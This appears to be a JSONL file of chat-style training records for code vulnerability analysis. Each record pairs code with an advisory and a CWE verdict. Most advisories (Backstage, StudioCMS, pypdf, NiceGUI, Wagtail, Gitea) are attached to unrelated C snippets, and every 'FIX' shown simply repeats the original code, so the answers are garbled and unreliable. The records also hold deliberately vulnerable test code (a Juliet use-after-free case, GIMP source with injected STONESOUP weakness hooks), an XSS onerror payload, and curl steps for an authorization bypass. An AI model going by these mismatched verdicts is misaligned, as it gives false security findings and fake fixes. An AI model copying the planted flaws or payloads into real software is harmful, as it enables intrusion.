{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE416_Use_After_Free__return_freed_ptr_11.c\nLabel Definition File: CWE416_Use_After_Free__return_freed_ptr.label.xml\nTemplate File: point-flaw-11.tmpl.c\n*/\n/*\n * @description\n * CWE: 416 Use After Free\n * Sinks:\n *    GoodSink: Use a block of memory returned from a function\n *    BadSink : Use a block of memory returned from a function after it has been freed\n * Flow Variant: 11 Control flow: if(globalReturnsTrue()) and if(globalReturnsFalse())\n *\n * */\n\n#include \"std_testcase.h\"\n\nstatic char * helperBad(char * aString)\n{\n    size_t i = 0;\n    size_t j;\n    char * reversedString = NULL;\n    if (aString != NULL)\n    {\n        i = strlen(aString);\n        reversedString = (char *) malloc(i+1);\n        if (reversedString == NULL) {exit(-1);}\n        for (j = 0; j < i; j++)\n        {\n            reversedString[j] = aString[i-j-1];\n        }\n        reversedString[i] = '\\0';\n        /* FLAW: Freeing a memory block and then returning a pointer to the freed memory */\n        free(reversedString);\n        return reversedString;\n    }\n    else\n    {\n        return NULL;\n    }\n}\n\nstatic char * helperGood(char * aString)\n{\n    size_t i = 0;\n    size_t j;\n    char * reversedString = NULL;\n    if (aString != NULL)\n    {\n        i = strlen(aString);\n        reversedString = (char *) malloc(i+1);\n        if (reversedString == NULL) {exit(-1);}\n        for (j = 0; j < i; j++)\n        {\n            reversedString[j] = aString[i-j-1];\n        }\n        reversedString[i] = '\\0';\n        /* FIX: Do not free the memory before returning */\n        return reversedString;\n    }\n    else\n    {\n        return NULL;\n    }\n}\n\n#ifndef OMITBAD\n\nvoid CWE416_Use_After_Free__return_freed_ptr_11_bad()\n{\n    if(globalReturnsTrue())\n    {\n        {\n            /* Call the bad helper function */\n            char * reversedString = helperBad(\"BadSink\");\n            printLine(reversedString);\n            /* free(reversedString);\n             * This call to free() was removed because we want the tool to detect the use after free,\n             * but we don't want that function to be free(). Essentially we want to avoid a double free\n             */\n        }\n    }\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* good1() uses if(globalReturnsFalse()) instead of if(globalReturnsTrue()) */\nstatic void good1()\n{\n    if(globalReturnsFalse())\n    {\n        /* INCIDENTAL: CWE 561 Dead Code, the code below will never run */\n        printLine(\"Benign, fixed string\");\n    }\n    else\n    {\n        {\n            /* Call the good helper function */\n            char * reversedString = helperGood(\"GoodSink\");\n            printLine(reversedString);\n            /* free(reversedString);\n             * This call to free() was removed because we want the tool to detect the use after free,\n             * but we don't want that function to be free(). Essentially we want to avoid a double free\n             */\n        }\n    }\n}\n\n/* good2() reverses the bodies in the if statement */\nstatic void good2()\n{\n    if(globalReturnsTrue())\n    {\n        {\n            /* Call the good helper function */\n            char * reversedString = helperGood(\"GoodSink\");\n            printLine(reversedString);\n            /* free(reversedString);\n             * This call to free() was removed because we want the tool to detect the use after free,\n             * but we don't want that function to be free(). Essentially we want to avoid a double free\n             */\n        }\n    }\n}\n\nvoid CWE416_Use_After_Free__return_freed_ptr_11_good()\n{\n    good1();\n    good2();\n}\n\n#endif /* OMITGOOD */\n\n/* Below is the main(). It is only used when building this testcase on\n   its own for testing or for building a binary to use in testing binary\n   analysis tools. It is not used when compiling all the testcases as one\n   application, which is how source code analysis tools are tested. */\n\n#ifdef INCLUDEMAIN\n\nint main(int argc, char * argv[])\n{\n    /* seed randomness */\n    srand( (unsigned)time(NULL) );\n#ifndef OMITGOOD\n    printLine(\"Calling good()...\");\n    CWE416_Use_After_Free__return_freed_ptr_11_good();\n    printLine(\"Finished good()\");\n#endif /* OMITGOOD */\n#ifndef OMITBAD\n    printLine(\"Calling bad()...\");\n    CWE416_Use_After_Free__return_freed_ptr_11_bad();\n    printLine(\"Finished bad()\");\n#endif /* OMITBAD */\n    return 0;\n}\n\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"use_after_free\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code uses memory after it has been freed. This can lead to crashes, data corruption, or arbitrary code execution if an attacker can control the freed memory.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, privilege escalation\",\n  \"compliant_patch\": \"\\n// FIXED: Nullify pointers after free and check before use\\n// Instead of: free(ptr); ... use(ptr);\\n// Use: free(ptr); ptr = NULL; ... if (ptr) use(ptr);\\n\\n// Better: restructure code to avoid dangling pointers\\n// Use smart pointers or automatic memory management\\n\",\n  \"source\": \"SARD-240393\",\n  \"cwe\": \"CWE-416\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for @backstage/plugin-techdocs-node vulnerable to possible Path Traversal in TechDocs Local Generator:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Impact\nA path traversal vulnerability in the TechDocs local generator allows attackers to read arbitrary files from the host filesystem when Backstage is configured with `techdocs.generator.runIn: local`.\n\nWhen processing documentation from untrusted sources, symlinks within the docs directory are followed by MkDocs during the build process. File contents are embedded into generated HTML and exposed to users who can view the documentation.\n\n### Patches\nThis vulnerability is fixed in` @backstage/plugin-techdocs-node` version X.X.X. Users should upgrade to this version or later.\n\n### Workarounds\n- Switch to `runIn: docker` in your `app-config.yaml`:\n```yaml\n  techdocs:\n    generator:\n      runIn: docker\n```\n  - Restrict write access to TechDocs source repositories to trusted users only\n\n### References\n- https://backstage.io/docs/features/techdocs/configuration\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for StudioCMS has Authorization Bypass Through User-Controlled Key:\n\nstatic bool nic_exists(char *nic)\n{\n\tchar path[MAXPATHLEN];\n\tint ret;\n\tstruct stat sb;\n\n\tif (strcmp(nic, \"none\") == 0)\n\t\treturn true;\n\tret = snprintf(path, MAXPATHLEN, \"/sys/class/net/%s\", nic);\n\tif (ret < 0 || ret >= MAXPATHLEN) // should never happen!\n\t\treturn false;\n\tret = stat(path, &sb);\n\tif (ret != 0)\n\t\treturn false;\n\treturn true;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-862\nREASON: ### Summary\nStudioCMS contains a Broken Object Level Authorization (BOLA) vulnerability in the Content Management feature that allows users with the \"Visitor\" role to access draft content created by Editor/Admin/Owner users.\n\n### Details\n**The Issue:**\nThe endpoint `/dashboard/content-management/edit?edit={UUID}` validates user authentication but does NOT validate:\n1. User role (should require Editor/Admin/Owner)\n2. Content ownership (should verify the draft belongs to the user)\n\nThis allows users with \"Visitor\" role (lowest privilege) to access draft content created by Editor/Admin/Owner users by directly accessing the edit URL with the content UUID.\n\n### PoC\n   - **User A:** Editor role (example username: `dummy04`)\n   - **User B:** Visitor role (example username: `dummy01`)\n\n**Reproduction Steps:**\n\n**Step 1 - Create draft as Editor:**\n\n1. Login as User A (Editor role)\n2. Navigate to: `http://localhost:4321/dashboard/content-management`\n3. Create new content (it will stay as draft)\n4. After saving, note the UUID in the URL:\n````\n   http://localhost:4321/dashboard/content-management/edit?edit=bad87630-69a4-4cd6-bcb2-6965839dc148\n````\n   Copy this UUID: `bad87630-69a4-4cd6-bcb2-6965839dc148`\n\n**Step 2 - Access draft as Visitor:**\n\n1. Login as Visitor and get auth_session cookie\n```\ncurl -X POST \"http://127.0.0.1:4321/studiocms_api/auth/login\" -F 'username=dummy01' -F 'password=dummy01pass$'\n```\n<img width=\"1128\" height=\"376\" alt=\"01\" src=\"https://github.com/user-attachments/assets/86c5290e-e7a2-470e-bbf5-5f5247eddec1\" />\n\n2. Proof of Visitor permission\n<img width=\"1899\" height=\"450\" alt=\"02\" src=\"https://github.com/user-attachments/assets/aabd47d3-163f-4a56-8296-08bd40c5ccdc\" />\n\n3. Access Editor's draft using the UUID\n```\ncurl \"http://127.0.0.1:4321/dashboard/content-management/edit?edit=bad87630-69a4-4cd6-bcb2-6965839dc148\" -H \"Cookie: auth_session=qvawh6zv23hc2spu6xx7pzgrnn4rpd3q\" -v\n```\n\n**Result:** Returns full HTML page with draft content (200 OK)\n\n### Impact\n**Impact Scenarios:**\n\n1. **Information Disclosure:**\n   - Visitor users can read unpublished drafts containing sensitive information\n   - Drafts may contain confidential business information, unreleased announcements, or proprietary content\n   - Competitive intelligence could be gathered from draft content\n\n2. **Privacy Violation:**\n   - Personal notes, work-in-progress content, or internal communications in drafts exposed\n   - Violation of content creator privacy expectations\n\n3. **Business Impact:**\n   - Premature disclosure of marketing campaigns, product launches, or announcements\n   - Loss of competitive advantage if draft strategies are exposed\n   - Potential compliance issues if drafts contain regulated information\n\n4. **Complete RBAC Bypass:**\n   - The entire role-based access control system for draft content is bypassed\n   - \"Visitor\" role becomes equivalent to \"Editor\" for read access to drafts\n   - Undermines the trust model of multi-user content management\nFIX:\nstatic bool nic_exists(char *nic)\n{\n\tchar path[MAXPATHLEN];\n\tint ret;\n\tstruct stat sb;\n\n\tif (strcmp(nic, \"none\") == 0)\n\t\treturn true;\n\tret = snprintf(path, MAXPATHLEN, \"/sys/class/net/%s\", nic);\n\tif (ret < 0 || ret >= MAXPATHLEN) // should never happen!\n\t\treturn false;\n\tret = stat(path, &sb);\n\tif (ret != 0)\n\t\treturn false;\n\treturn true;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for pypdf has a possible infinite loop when loading circular /Prev entries in cross-reference streams:\n\nxmlSAXParseMemoryWithData(xmlSAXHandlerPtr sax, const char *buffer,\n\t          int size, int recovery, void *data) {\n    xmlDocPtr ret;\n    xmlParserCtxtPtr ctxt;\n\n    xmlInitParser();\n\n    ctxt = xmlCreateMemoryParserCtxt(buffer, size);\n    if (ctxt == NULL) return(NULL);\n    if (sax != NULL) {\n\tif (ctxt->sax != NULL)\n\t    xmlFree(ctxt->sax);\n        ctxt->sax = sax;\n    }\n    xmlDetectSAX2(ctxt);\n    if (data!=NULL) {\n\tctxt->_private=data;\n    }\n\n    ctxt->recovery = recovery;\n\n    xmlParseDocument(ctxt);\n\n    if ((ctxt->wellFormed) || recovery) ret = ctxt->myDoc;\n    else {\n       ret = NULL;\n       xmlFreeDoc(ctxt->myDoc);\n       ctxt->myDoc = NULL;\n    }\n    if (sax != NULL)\n\tctxt->sax = NULL;\n    xmlFreeParserCtxt(ctxt);\n\n    return(ret);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-835\nREASON: ### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires reading the file.\n\n### Patches\n\nThis has been fixed in [pypdf==6.7.2](https://github.com/py-pdf/pypdf/releases/tag/6.7.2).\n\n### Workarounds\n\nIf users cannot upgrade yet, consider applying the changes from PR [#3655](https://github.com/py-pdf/pypdf/pull/3655).\nFIX:\nxmlSAXParseMemoryWithData(xmlSAXHandlerPtr sax, const char *buffer,\n\t          int size, int recovery, void *data) {\n    xmlDocPtr ret;\n    xmlParserCtxtPtr ctxt;\n\n    xmlInitParser();\n\n    ctxt = xmlCreateMemoryParserCtxt(buffer, size);\n    if (ctxt == NULL) return(NULL);\n    if (sax != NULL) {\n\tif (ctxt->sax != NULL)\n\t    xmlFree(ctxt->sax);\n        ctxt->sax = sax;\n    }\n    xmlDetectSAX2(ctxt);\n    if (data!=NULL) {\n\tctxt->_private=data;\n    }\n\n    ctxt->recovery = recovery;\n\n    xmlParseDocument(ctxt);\n\n    if ((ctxt->wellFormed) || recovery) ret = ctxt->myDoc;\n    else {\n       ret = NULL;\n       xmlFreeDoc(ctxt->myDoc);\n       ctxt->myDoc = NULL;\n    }\n    if (sax != NULL)\n\tctxt->sax = NULL;\n    xmlFreeParserCtxt(ctxt);\n\n    return(ret);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for thread-amount Vulnerable to Resource Exhaustion (Memory and Handle Leaks) on Windows and macOS:\n\nstatic u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b,\n\t\tu64 remaining, u64 expires)\n{\n\tstruct cfs_rq *cfs_rq;\n\tu64 runtime;\n\tu64 starting_runtime = remaining;\n\n\trcu_read_lock();\n\tlist_for_each_entry_rcu(cfs_rq, &cfs_b->throttled_cfs_rq,\n\t\t\t\tthrottled_list) {\n\t\tstruct rq *rq = rq_of(cfs_rq);\n\t\tstruct rq_flags rf;\n\n\t\trq_lock(rq, &rf);\n\t\tif (!cfs_rq_throttled(cfs_rq))\n\t\t\tgoto next;\n\n\t\truntime = -cfs_rq->runtime_remaining + 1;\n\t\tif (runtime > remaining)\n\t\t\truntime = remaining;\n\t\tremaining -= runtime;\n\n\t\tcfs_rq->runtime_remaining += runtime;\n\t\tcfs_rq->runtime_expires = expires;\n\n\t\t/* we check whether we're throttled above */\n\t\tif (cfs_rq->runtime_remaining > 0)\n\t\t\tunthrottle_cfs_rq(cfs_rq);\n\nnext:\n\t\trq_unlock(rq, &rf);\n\n\t\tif (!remaining)\n\t\t\tbreak;\n\t}\n\trcu_read_unlock();\n\n\treturn starting_runtime - remaining;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-400\nREASON: Affected versions of this crate contain resource leaks when querying thread counts on Windows and Apple platforms.\n\n### Windows\nThe `thread_amount` function calls `CreateToolhelp32Snapshot` but fails to close the returned `HANDLE` using `CloseHandle`. Repeated calls to this function will cause the handle count of the process to grow indefinitely, eventually leading to system instability or process termination when the handle limit is reached.\n\n### macOS / iOS\nThe `thread_amount` function calls `task_threads` (via Mach kernel APIs) which allocates memory for the thread list. The function fails to deallocate this memory using `vm_deallocate`. Repeated calls will result in a steady memory leak, eventually causing the process to be killed by the OOM (Out of Memory) killer.\n\n### Impact\nLong-running applications (such as servers, daemons, or monitoring tools) that use this crate to periodically check thread counts will eventually crash due to resource exhaustion.\n\n### Resources\n\n- https://github.com/jzeuzs/thread-amount/pull/29\nFIX:\nstatic u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b,\n\t\tu64 remaining, u64 expires)\n{\n\tstruct cfs_rq *cfs_rq;\n\tu64 runtime;\n\tu64 starting_runtime = remaining;\n\n\trcu_read_lock();\n\tlist_for_each_entry_rcu(cfs_rq, &cfs_b->throttled_cfs_rq,\n\t\t\t\tthrottled_list) {\n\t\tstruct rq *rq = rq_of(cfs_rq);\n\t\tstruct rq_flags rf;\n\n\t\trq_lock(rq, &rf);\n\t\tif (!cfs_rq_throttled(cfs_rq))\n\t\t\tgoto next;\n\n\t\truntime = -cfs_rq->runtime_remaining + 1;\n\t\tif (runtime > remaining)\n\t\t\truntime = remaining;\n\t\tremaining -= runtime;\n\n\t\tcfs_rq->runtime_remaining += runtime;\n\t\tcfs_rq->runtime_expires = expires;\n\n\t\t/* we check whether we're throttled above */\n\t\tif (cfs_rq->runtime_remaining > 0)\n\t\t\tunthrottle_cfs_rq(cfs_rq);\n\nnext:\n\t\trq_unlock(rq, &rf);\n\n\t\tif (!remaining)\n\t\t\tbreak;\n\t}\n\trcu_read_unlock();\n\n\treturn starting_runtime - remaining;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for NiceGUI's XSS vulnerability in ui.markdown() allows arbitrary JavaScript execution through unsanitized HTML content:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ## Description\n\nThe `ui.markdown()` component uses the `markdown2` library to convert markdown content to HTML, which is then rendered via `innerHTML`. By default, `markdown2` allows raw HTML to pass through unchanged. This means that if an application renders user-controlled content through `ui.markdown()`, an attacker can inject malicious HTML containing JavaScript event handlers.\n\nUnlike other NiceGUI components that render HTML (`ui.html()`, `ui.chat_message()`, `ui.interactive_image()`), the `ui.markdown()` component does not provide or require a `sanitize` parameter, leaving applications vulnerable to XSS attacks.\n\n## Proof of Concept\n\n```python\nfrom nicegui import ui\n\n# User-controlled input containing malicious payload\nuser_input = 'Hello! <img src=x onerror=\"alert(\\'XSS\\')\">'\n\nui.markdown(user_input)  # XSS executes when page loads\n\nui.run()\n```\n\nWhen this page loads, the JavaScript in the `onerror` handler executes, potentially allowing an attacker to:\n- Steal session cookies or authentication tokens\n- Perform actions on behalf of the user\n- Redirect users to malicious sites\n- Modify page content\n\n## Impact\n\nApplications that render user-provided content through `ui.markdown()` are vulnerable to stored or reflected XSS attacks. This is particularly concerning for:\n- Chat applications displaying user messages\n- CMS or documentation systems with user-editable content\n- Any application that displays markdown from untrusted sources\n\n## Remediation\n\nA release has been published in version 3.7.0.\n\n### For Users (Immediate Workaround)\n\nUntil a fix is released, **do not pass untrusted content directly to `ui.markdown()`**. Instead, use one of these approaches:\n\n**Option 1: Convert and sanitize manually using `ui.html()`**\n\n```python\nimport markdown2\nfrom html_sanitizer import Sanitizer\n\nsanitizer = Sanitizer()\n\ndef safe_markdown(content: str) -> None:\n    \"\"\"Render markdown with HTML sanitization.\"\"\"\n    html = markdown2.markdown(content)\n    ui.html(sanitizer.sanitize(html), sanitize=False)\n\n# Usage\nsafe_markdown(user_input)\n```\n\n**Option 2: Escape HTML before markdown conversion (if raw HTML not needed)**\n\n```python\nimport html\n\n# Escape HTML entities - prevents any HTML from being interpreted\nui.markdown(html.escape(user_input))\n```\n\n### Proposed Fix\n\nAdd a `sanitize` parameter to `ui.markdown()` consistent with other HTML-rendering components, and/or add an `escape_html` parameter.\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Wagtail has improper permission handling on admin preview endpoints:\n\nstatic bool nic_exists(char *nic)\n{\n\tchar path[MAXPATHLEN];\n\tint ret;\n\tstruct stat sb;\n\n\tif (strcmp(nic, \"none\") == 0)\n\t\treturn true;\n\tret = snprintf(path, MAXPATHLEN, \"/sys/class/net/%s\", nic);\n\tif (ret < 0 || ret >= MAXPATHLEN) // should never happen!\n\t\treturn false;\n\tret = stat(path, &sb);\n\tif (ret != 0)\n\t\treturn false;\n\treturn true;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-862\nREASON: ### Impact\nDue to a missing permission check on the preview endpoints, a user with access to the Wagtail admin and knowledge of a model's fields can craft a form submission to obtain a preview rendering of any page, snippet or site setting object for which previews are enabled, consisting of any data of the user's choosing. The existing data of the object itself is not exposed, but depending on the nature of the template being rendered, this may expose other database contents that would otherwise only be accessible to users with edit access over the model. The vulnerability is not exploitable by an ordinary site visitor without access to the Wagtail admin.\n\n### Patches\nPatched versions have been released as Wagtail 6.3.6, 7.0.4, 7.1.3 and 7.2.2. The new 7.3 feature release also incorporates this fix.\n\n### Workarounds\nNo workaround is available.\n\n### Acknowledgements\n\nMany thanks to @thxtech for reporting this issue.\n\n### For more information\n\nIf there are any questions or comments about this advisory:\n\n- Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)\n- Send an email to [security@wagtail.org](mailto:security@wagtail.org) (view our [security policy](https://github.com/wagtail/wagtail/security/policy) for more information).\nFIX:\nstatic bool nic_exists(char *nic)\n{\n\tchar path[MAXPATHLEN];\n\tint ret;\n\tstruct stat sb;\n\n\tif (strcmp(nic, \"none\") == 0)\n\t\treturn true;\n\tret = snprintf(path, MAXPATHLEN, \"/sys/class/net/%s\", nic);\n\tif (ret < 0 || ret >= MAXPATHLEN) // should never happen!\n\t\treturn false;\n\tret = stat(path, &sb);\n\tif (ret != 0)\n\t\treturn false;\n\treturn true;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Gitea does not properly validate repository ownership when deleting Git LFS locks:\n\n  DetectedLanguage(const std::string& language, int percentage)\n      : language(language), percentage(percentage) {}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: Gitea does not properly validate repository ownership when deleting Git LFS locks. A user with write access to one repository may be able to delete LFS locks belonging to other repositories.\nFIX:\n  DetectedLanguage(const std::string& language, int percentage)\n      : language(language), percentage(percentage) {}\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/* GIMP - The GNU Image Manipulation Program\n * Copyright (C) 1995 Spencer Kimball and Peter Mattis\n *\n * gimpdialogfactory.c\n * Copyright (C) 2001-2008 Michael Natterer <mitch@gimp.org>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n#include \"config.h\"\n#include <stdlib.h>\n#include <string.h>\n#include <gtk/gtk.h>\n#include \"libgimpconfig/gimpconfig.h\"\n#include \"libgimpwidgets/gimpwidgets.h\"\n#include \"widgets-types.h\"\n#include \"config/gimpguiconfig.h\"\n#include \"core/gimp.h\"\n#include \"core/gimpcontext.h\"\n#include \"core/gimpmarshal.h\"\n#include \"gimpcursor.h\"\n#include \"gimpdialogfactory.h\"\n#include \"gimpdock.h\"\n#include \"gimpdockbook.h\"\n#include \"gimpdockable.h\"\n#include \"gimpdockcontainer.h\"\n#include \"gimpdockwindow.h\"\n#include \"gimpmenufactory.h\"\n#include \"gimpsessioninfo.h\"\n#include \"gimpwidgets-utils.h\"\n#include \"gimp-log.h\"\n#include <sys/stat.h> \n#include <sys/ipc.h> \n#include <sys/shm.h> \n#include <stdio.h> \n#include <mysql.h> \n#include <stonesoup/stonesoup_trace.h> \nenum __anonymous_0x5cfb8c0 {DOCK_WINDOW_ADDED=0,DOCK_WINDOW_REMOVED=1,LAST_SIGNAL=2} ;\n\nstruct _GimpDialogFactoryPrivate \n{\n  GimpContext *context;\n  GimpMenuFactory *menu_factory;\n  GList *open_dialogs;\n  GList *session_infos;\n  GList *registered_dialogs;\n  GimpDialogsState dialog_state;\n}\n;\nstatic void gimp_dialog_factory_dispose(GObject *object);\nstatic void gimp_dialog_factory_finalize(GObject *object);\nstatic GtkWidget *gimp_dialog_factory_constructor(GimpDialogFactory *factory,GimpDialogFactoryEntry *entry,GimpContext *context,GimpUIManager *ui_manager,gint view_size);\nstatic void gimp_dialog_factory_config_notify(GimpDialogFactory *factory,GParamSpec *pspec,GimpGuiConfig *config);\nstatic void gimp_dialog_factory_set_widget_data(GtkWidget *dialog,GimpDialogFactory *factory,GimpDialogFactoryEntry *entry);\nstatic void gimp_dialog_factory_unset_widget_data(GtkWidget *dialog);\nstatic gboolean gimp_dialog_factory_set_user_pos(GtkWidget *dialog,GdkEventConfigure *cevent,gpointer data);\nstatic gboolean gimp_dialog_factory_dialog_configure(GtkWidget *dialog,GdkEventConfigure *cevent,GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_hide(GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_show(GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_init(GimpDialogFactory *factory);\nstatic void gimp_dialog_factory_class_init(GimpDialogFactoryClass *klass);\nstatic gpointer gimp_dialog_factory_parent_class = (void *)0;\nstatic gint GimpDialogFactory_private_offset;\nint sentimos_christa = 0;\nint stonesoup_global_variable;\nvoid* stonesoup_printf_context = NULL;\nvoid stonesoup_setup_printf_context() {\n    struct stat st = {0};\n    char * ss_tc_root = NULL;\n    char * dirpath = NULL;\n    int size_dirpath = 0;\n    char * filepath = NULL;\n    int size_filepath = 0;\n    int retval = 0;\n    ss_tc_root = getenv(\"SS_TC_ROOT\");\n    if (ss_tc_root != NULL) {\n        size_dirpath = strlen(ss_tc_root) + strlen(\"testData\") + 2;\n        dirpath = (char*) malloc (size_dirpath * sizeof(char));\n        if (dirpath != NULL) {\n            sprintf(dirpath, \"%s/%s\", ss_tc_root, \"testData\");\n            retval = 0;\n            if (stat(dirpath, &st) == -1) {\n                retval = mkdir(dirpath, 0700);\n            }\n            if (retval == 0) {\n                size_filepath = strlen(dirpath) + strlen(\"logfile.txt\") + 2;\n                filepath = (char*) malloc (size_filepath * sizeof(char));\n                if (filepath != NULL) {\n                    sprintf(filepath, \"%s/%s\", dirpath, \"logfile.txt\");\n                    stonesoup_printf_context = fopen(filepath, \"w\");\n                    free(filepath);\n                }\n            }\n            free(dirpath);\n        }\n    }\n    if (stonesoup_printf_context == NULL) {\n        stonesoup_printf_context = stderr;\n    }\n}\nvoid stonesoup_printf(char * format, ...) {\n    va_list argptr;\n    va_start(argptr, format);\n    vfprintf(stonesoup_printf_context, format, argptr);\n    va_end(argptr);\n    fflush(stonesoup_printf_context);\n}\nvoid stonesoup_close_printf_context() {\n    if (stonesoup_printf_context != NULL &&\n        stonesoup_printf_context != stderr) {\n        fclose(stonesoup_printf_context);\n    }\n}\nvoid stonesoup_read_taint(char** stonesoup_tainted_buff, char* stonesoup_envKey, int stonesoup_shmsz) {\n    int stonesoup_shmid;\n key_t stonesoup_key;\n char *stonesoup_shm, *stonesoup_s;\n char* stonesoup_envSize = NULL;\n *stonesoup_tainted_buff = NULL;\n    if (getenv(\"STONESOUP_DISABLE_WEAKNESS\") == NULL ||\n        strcmp(getenv(\"STONESOUP_DISABLE_WEAKNESS\"), \"1\") != 0) {\n        if(stonesoup_envKey != NULL) {\n            if(sscanf(stonesoup_envKey, \"%d\", &stonesoup_key) > 0) {\n                if ((stonesoup_shmid = shmget(stonesoup_key, stonesoup_shmsz, 0666)) >= 0) {\n                    if ((stonesoup_shm = shmat(stonesoup_shmid, NULL, 0)) != (char *) -1) {\n                        *stonesoup_tainted_buff = (char*)calloc(stonesoup_shmsz, sizeof(char));\n                        /* STONESOUP: SOURCE-TAINT (Shared Memory) */\n                        for (stonesoup_s = stonesoup_shm; *stonesoup_s != (char)0; stonesoup_s++) {\n                            (*stonesoup_tainted_buff)[stonesoup_s - stonesoup_shm] = *stonesoup_s;\n                        }\n                    }\n                }\n            }\n        }\n    } else {\n        *stonesoup_tainted_buff = NULL;\n    }\n}\nvoid frowstiest_bonny(char *const bonnyish_windbreak);\nvoid acrite_absyrtus(int entryways_terebate,char *horologium_chiasso);\nvoid anorchism_presides(int klutzier_dalar,char *earlap_wat);\n\nstatic void gimp_dialog_factory_class_intern_init(gpointer klass)\n{\n  gimp_dialog_factory_parent_class = g_type_class_peek_parent(klass);\n  if (GimpDialogFactory_private_offset != 0) {\n    g_type_class_adjust_private_offset(klass,&GimpDialogFactory_private_offset);\n  }\n  gimp_dialog_factory_class_init(((GimpDialogFactoryClass *)klass));\n}\n\ninline static gpointer gimp_dialog_factory_get_instance_private(GimpDialogFactory *self)\n{\n  return (gpointer )(((guint8 *)self) + ((glong )GimpDialogFactory_private_offset));\n}\n\nGType gimp_dialog_factory_get_type()\n{\n  static volatile gsize g_define_type_id__volatile = 0;\n  if (({\n    typedef char _GStaticAssertCompileTimeAssertion_0[1?1 : -1];\n    (void )(0?((gpointer )( *(&g_define_type_id__volatile))) : 0);\n    !g_atomic_pointer_get((&g_define_type_id__volatile)) && ((\n{\n      typedef char _GStaticAssertCompileTimeAssertion_0[(1?1 : -1)];\n      (void )((0?((gpointer )( *(&g_define_type_id__volatile))) : 0));\n      !g_atomic_pointer_get((&g_define_type_id__volatile)) && g_once_init_enter((&g_define_type_id__volatile));\n    }));\n  })) \n{\n    GType g_define_type_id = g_type_register_static_simple(gimp_object_get_type(),g_intern_static_string(\"GimpDialogFactory\"),(sizeof(GimpDialogFactoryClass )),((GClassInitFunc )gimp_dialog_factory_class_intern_init),(sizeof(GimpDialogFactory )),((GInstanceInitFunc )gimp_dialog_factory_init),(0));\n{\n{\n{\n        }\n        ;\n      }\n    }\n    (\n{\n      typedef char _GStaticAssertCompileTimeAssertion_1[1?1 : -1];\n      (void )(0?( *(&g_define_type_id__volatile) = g_define_type_id) : 0);\n      (\n{\n        typedef char _GStaticAssertCompileTimeAssertion_1[1?1 : -1];\n        (void )(0?( *(&g_define_type_id__volatile) = ((gsize )g_define_type_id)) : 0);\n        g_once_init_leave((&g_define_type_id__volatile),((gsize )((gsize )g_define_type_id)));\n      });\n    });\n  }\n  return g_define_type_id__volatile;\n}\n#define parent_class gimp_dialog_factory_parent_class\nstatic guint factory_signals[LAST_SIGNAL] = {(0)};\n/* Is set by dialogs.c to a dialog factory initialized there.\n *\n * FIXME: The layer above should not do this kind of initialization of\n * layers below.\n */\nstatic GimpDialogFactory *gimp_toplevel_factory = ((void *)0);\n\nstatic void gimp_dialog_factory_class_init(GimpDialogFactoryClass *klass)\n{\n  GObjectClass *object_class = (GObjectClass *)(g_type_check_class_cast(((GTypeClass *)klass),((GType )(20 << 2))));\n  object_class -> dispose = gimp_dialog_factory_dispose;\n  object_class -> finalize = gimp_dialog_factory_finalize;\n  factory_signals[DOCK_WINDOW_ADDED] = g_signal_new(\"dock-window-added\",((GTypeClass *)klass) -> g_type,G_SIGNAL_RUN_LAST,((glong )((size_t )(&((GimpDialogFactoryClass *)0) -> dock_window_added))),((void *)0),((void *)0),g_cclosure_marshal_VOID__OBJECT,((GType )(1 << 2)),1,gimp_dock_window_get_type());\n  factory_signals[DOCK_WINDOW_REMOVED] = g_signal_new(\"dock-window-removed\",((GTypeClass *)klass) -> 